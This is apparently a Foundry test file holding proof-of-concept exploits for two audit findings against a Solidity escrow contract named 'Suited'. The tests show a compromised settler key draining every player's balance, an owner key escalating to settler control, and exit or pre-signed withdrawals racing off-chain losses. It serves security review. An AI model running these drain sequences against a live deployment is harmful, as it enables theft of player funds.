// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Suited} from "../src/Suited.sol";

///                      48
///                      48
///                      48
///                     4488
///                    444888
///                 44444 88888
///                444444 888888
///              44444444 88888888
///             444444444 888888888
///           44444444444 88888888888
///         4444444444444 8888888888888
///       444444444444444 888888888888888
///     44444444444444444 88888888888888888
///  44444444444444444444 8888888888888888888
/// 4444444444444444444444 88888888888888888888
///  44444444444444444444 8888888888888888888
///     44444444444444444 88888888888888888
///       444444444444444 888888888888888
///         4444444444444 8888888888888
///           44444444444 88888888888
///             444444444 888888888
///              44444444 88888888
///                444444 888888
///                 44444 88888
///                    444888
///                     4488
///                      48
///                      48
////                     48

contract MockUSDG is ERC20 {
    constructor() ERC20("Mock USDG", "USDG") {}

    function decimals() public pure override returns (uint8) {
        return 6;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// PoCs for review findings M1 and M2.
/// Every test asserts the CURRENT (vulnerable) behaviour, so they all PASS
/// Test contract == deployer == owner of Suited (Ownable(msg.sender)).
contract SuitedPoC is Test {
    uint256 internal constant SETTLER_PK = 0xA11CE;
    uint256 internal constant MIN_DEPOSIT = 1e6; // 1 USDG
    uint256 internal constant EXIT_DELAY = 1 hours;
    uint256 internal constant STAKE = 1_000e6; // 1,000 USDG

    MockUSDG internal token;
    Suited internal suited;
    address internal settler;
    address internal attacker = makeAddr("attacker");
    address internal bob = makeAddr("bob");

    function setUp() public {
        settler = vm.addr(SETTLER_PK);
        token = new MockUSDG();
        suited = new Suited(IERC20(address(token)), settler, MIN_DEPOSIT, EXIT_DELAY);
    }

    // ═════════════════════════════════════════════════════════════════════
    // M1 -- one hot key can move every player's balance
    // ═════════════════════════════════════════════════════════════════════

    /// 23 victims + 1 attacker wallet in a single, fully valid checkpoint.
    /// The attacker then withdraws everything with a settler-signed auth,
    /// AFTER the owner pauses (pause does not gate withdraw).
    function test_F1_settlerDrainsVictimsIntoAttackerWallet() public {
        address[] memory ps = new address[](24);
        int256[] memory ds = new int256[](24);

        for (uint256 i = 0; i < 23; i++) {
            address v = address(uint160(0x1000 + i));
            _fund(v, STAKE);
            ps[i] = v;
            ds[i] = -int256(STAKE);
        }
        _fund(attacker, MIN_DEPOSIT);
        ps[23] = attacker;
        ds[23] = int256(23 * STAKE);

        // Every guard passes: onlySettler, seq+1, zero-sum, no duplicates,
        // everDeposited, each debit <= that victim's balance, rake = 0.
        _checkpoint(1, ps, ds, 0);

        uint256 loot = MIN_DEPOSIT + 23 * STAKE;
        assertEq(_bal(attacker), loot, "attacker holds all victim funds in-ledger");
        for (uint256 i = 0; i < 23; i++) {
            assertEq(_bal(ps[i]), 0, "victim zeroed");
        }

        // Owner reacts by pausing. It is too late: withdraw is not pause-gated.
        suited.setPaused(true);

        bytes32 authId = keccak256("f1-auth");
        uint256 deadline = block.timestamp + 10 minutes;
        bytes memory sig = _sign(SETTLER_PK, suited.WITHDRAW_AUTH_TYPEHASH(), attacker, loot, authId, deadline);

        vm.prank(attacker);
        suited.withdraw(loot, authId, deadline, sig);

        assertEq(token.balanceOf(attacker), loot, "attacker walked out with 23k + own deposit");
        // The solvency invariant is perfectly happy throughout -- it can't see this.
        assertGe(token.balanceOf(address(suited)), suited.liabilities() + suited.rakeCollected());
        assertEq(suited.liabilities(), 0);
    }

    /// A victim's pending exit does not protect them: the same checkpoint
    /// clamps exitAmount to the new (zero) balance, so claimExit pays nothing.
    function test_F1_victimExitHatchIsClampedAwayByCheckpoint() public {
        address victim = makeAddr("victim");
        _fund(victim, STAKE);
        _fund(attacker, MIN_DEPOSIT);

        vm.prank(victim);
        suited.requestExit(STAKE);

        (address[] memory ps, int256[] memory ds) = _pair(victim, -int256(STAKE), attacker, int256(STAKE));
        _checkpoint(1, ps, ds, 0);

        (uint256 bal, uint256 exitAmount, uint64 exitAt,) = suited.players(victim);
        assertEq(bal, 0);
        assertEq(exitAmount, 0, "exit amount clamped to 0 by checkpoint");
        assertGt(exitAt, 0, "exit still 'pending' but worth nothing");

        vm.warp(block.timestamp + EXIT_DELAY);
        vm.prank(victim);
        vm.expectRevert(Suited.InvalidAmount.selector);
        suited.claimExit();

        assertEq(token.balanceOf(victim), 0, "victim never gets paid");
    }

    /// Owner-key compromise escalates to settler-key compromise instantly:
    /// setSettler has no timelock, so the attacker rotates in their own
    /// signer and then runs the same drain.
    function test_F1_ownerKeyEscalatesToSettlerInstantly() public {
        address victim = makeAddr("victim");
        _fund(victim, STAKE);
        _fund(attacker, MIN_DEPOSIT);

        uint256 evilPk = 0xBADBEEF;
        address evilSettler = vm.addr(evilPk);
        suited.setSettler(evilSettler); // owner == address(this)

        (address[] memory ps, int256[] memory ds) = _pair(victim, -int256(STAKE), attacker, int256(STAKE));
        vm.prank(evilSettler);
        suited.checkpoint(1, ps, ds, 0);

        uint256 amount = MIN_DEPOSIT + STAKE;
        bytes32 authId = keccak256("f1-owner-auth");
        uint256 deadline = block.timestamp + 10 minutes;
        bytes memory sig = _sign(evilPk, suited.WITHDRAW_AUTH_TYPEHASH(), attacker, amount, authId, deadline);

        vm.prank(attacker);
        suited.withdraw(amount, authId, deadline, sig);

        assertEq(token.balanceOf(attacker), amount);
        assertEq(_bal(victim), 0);
    }

    // ═════════════════════════════════════════════════════════════════════
    // M2-- exits / pre-signed auths race off-chain stakes
    // ═════════════════════════════════════════════════════════════════════

    /// Sequence A:Malicious Actor requests exit, loses a hand off-chain to Bob,
    /// claims the exit before the gateway's checkpoint lands. The checkpoint
    /// then reverts, and because checkpoint is atomic and seq is global, an
    /// unrelated pair of players in the same batch is wedged with it.
    function test_F2A_exitClaimedAfterOffchainLossWedgesBatch() public {
        address c = makeAddr("tableTwoWinner");
        address d = makeAddr("tableTwoLoser");
        _fund(attacker, STAKE);
        _fund(bob, STAKE);
        _fund(c, 100e6);
        _fund(d, 100e6);

        vm.prank(attacker);
        suited.requestExit(STAKE);

        // --- off-chain: attacker loses STAKE to bob at the table ---

        vm.warp(block.timestamp + EXIT_DELAY);
        vm.prank(attacker);
        suited.claimExit();
        assertEq(token.balanceOf(attacker), STAKE, "attacker exited with the money they just lost");
        assertEq(_bal(attacker), 0);

        // Gateway nets the hand into a checkpoint (plus an unrelated table).
        address[] memory ps = new address[](4);
        int256[] memory ds = new int256[](4);
        ps[0] = attacker; ds[0] = -int256(STAKE);
        ps[1] = bob;      ds[1] = int256(STAKE);
        ps[2] = c;        ds[2] = int256(50e6);
        ps[3] = d;        ds[3] = -int256(50e6);

        vm.expectRevert(Suited.InsufficientBalance.selector);
        _checkpoint(1, ps, ds, 0);

        // Whole batch reverted: seq stuck, innocent table c/d not settled.
        assertEq(suited.checkpointSeq(), 0, "global seq wedged");
        assertEq(_bal(c), 100e6);
        assertEq(_bal(d), 100e6);
        // Opponent's winnings are uncollectible: his ledger balance is his own deposit only.
        assertEq(_bal(bob), STAKE, "winner can never be credited");

        // Recovery requires the gateway to rebuild the batch without the poisoned entries.
        (address[] memory ps2, int256[] memory ds2) = _pair(c, int256(50e6), d, -int256(50e6));
        _checkpoint(1, ps2, ds2, 0);
        assertEq(suited.checkpointSeq(), 1);
        assertEq(_bal(c), 150e6);
    }

    /// Sequence B: a withdraw authorization for the full bankroll is issued,
    /// the holder keeps playing with those chips, loses, then redeems the
    /// still-valid signature anywhere inside the deadline window.
    function test_F2B_preSignedWithdrawAuthSpentAfterOffchainLoss() public {
        _fund(attacker, STAKE);
        _fund(bob, STAKE);

        bytes32 authId = keccak256("f2b-auth");
        uint256 deadline = block.timestamp + 10 minutes;
        bytes memory sig = _sign(SETTLER_PK, suited.WITHDRAW_AUTH_TYPEHASH(), attacker, STAKE, authId, deadline);

        // --- off-chain: actor sits down with full chips and loses STAKE to bob ---
        vm.warp(block.timestamp + 9 minutes); // still inside the window

        vm.prank(attacker);
        suited.withdraw(STAKE, authId, deadline, sig);
        assertEq(token.balanceOf(attacker), STAKE, "auth honoured despite the loss");
        assertTrue(suited.usedAuths(authId));

        (address[] memory ps, int256[] memory ds) = _pair(attacker, -int256(STAKE), bob, int256(STAKE));
        vm.expectRevert(Suited.InsufficientBalance.selector);
        _checkpoint(1, ps, ds, 0);
        assertEq(suited.checkpointSeq(), 0);
    }

    /// Sequence C: owner pauses during an incident. Checkpoints stop, but
    /// exit clocks keep running, so exits become claimable against hands
    /// that can no longer be settled.
    function test_F2C_pauseFreezesSettlementButNotExitClocks() public {
        _fund(attacker, STAKE);
        _fund(bob, STAKE);

        vm.prank(attacker);
        suited.requestExit(STAKE);

        suited.setPaused(true);

        // --- off-chain: hand finishes, malicious actor lost to bob ---
        (address[] memory ps, int256[] memory ds) = _pair(attacker, -int256(STAKE), bob, int256(STAKE));
        vm.expectRevert(Suited.EnforcedPause.selector);
        _checkpoint(1, ps, ds, 0);

        vm.warp(block.timestamp + EXIT_DELAY);
        vm.prank(attacker);
        suited.claimExit(); // not pause-gated

        assertEq(token.balanceOf(attacker), STAKE);
        assertEq(_bal(attacker), 0);

        // After unpause the same checkpoint can never apply.
        suited.setPaused(false);
        vm.expectRevert(Suited.InsufficientBalance.selector);
        _checkpoint(1, ps, ds, 0);
    }

    // ═════════════════════════════════════════════════════════════════════
    // helpers
    // ═════════════════════════════════════════════════════════════════════

    function _fund(address who, uint256 amount) internal {
        token.mint(who, amount);
        vm.startPrank(who);
        token.approve(address(suited), amount);
        suited.deposit(amount);
        vm.stopPrank();
    }

    function _checkpoint(uint256 seq, address[] memory ps, int256[] memory ds, uint256 rake) internal {
        vm.prank(settler);
        suited.checkpoint(seq, ps, ds, rake);
    }

    function _pair(address a, int256 da, address b, int256 db)
        internal
        pure
        returns (address[] memory ps, int256[] memory ds)
    {
        ps = new address[](2);
        ds = new int256[](2);
        ps[0] = a;
        ds[0] = da;
        ps[1] = b;
        ds[1] = db;
    }

    function _bal(address who) internal view returns (uint256 b) {
        (b,,,) = suited.players(who);
    }

    function _domainSeparator() internal view returns (bytes32) {
        return keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes("Suited")),
                keccak256(bytes("1")),
                block.chainid,
                address(suited)
            )
        );
    }

    /// Settler-style EIP-712 signature over WithdrawAuth / RedeemAuth.
    function _sign(uint256 pk, bytes32 typehash, address player, uint256 amount, bytes32 authId, uint256 deadline)
        internal
        view
        returns (bytes memory)
    {
        bytes32 structHash = keccak256(abi.encode(typehash, player, amount, authId, deadline));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", _domainSeparator(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, v);
    }
}

